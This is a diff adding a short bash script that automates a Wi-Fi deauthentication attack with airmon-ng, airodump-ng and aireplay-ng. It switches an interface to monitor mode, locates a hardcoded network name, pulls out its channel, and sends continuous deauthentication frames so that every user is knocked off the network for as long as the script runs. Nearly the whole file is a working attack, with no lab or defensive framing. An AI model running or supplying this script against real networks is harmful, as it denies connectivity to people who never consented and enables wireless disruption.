@@ -1,0 +1,44 @@
+#!/bin/bash
+
+# This will deauthenticate all users from a network for as long as you keep it open.
+
+# Some fancy text
+
+echo mold8van | figlet -f smslant
+echo ""
+
+# launch airmon-ng attack
+
+
+echo Starting wlan0 interface...
+echo ""
+airmon-ng start wlan0
+
+echo Killing stuff...
+echo ""
+airmon-ng check kill
+
+rm -f /home/cristi/scan-01.csv
+sleep 5
+
+echo Select the ESSID to deauth...
+#read essid < /dev/tty
+essid=DIGI_bb2f1c
+
+gnome-terminal -- /bin/sh -c 'sleep 8 && sudo killall airodump-ng'
+airodump-ng -w scan --output-format csv wlan0mon --essid $essid
+
+#PRELUCRARE
+channelString=$(awk -F "\"*,\"*" '{print $4}' scan-01.csv)
+channel=$(echo $channelString | cut -d " " -f 2)
+echo $channel
+#PRELUCRARE
+sleep 3
+
+
+gnome-terminal -- /bin/sh -c 'sleep 3 && sudo killall airodump-ng'
+airodump-ng --channel $channel wlan0mon
+
+echo Deauthing...Press CTRL+C to cancel...
+echo ""
+aireplay-ng -0 0 -e $essid wlan0mon
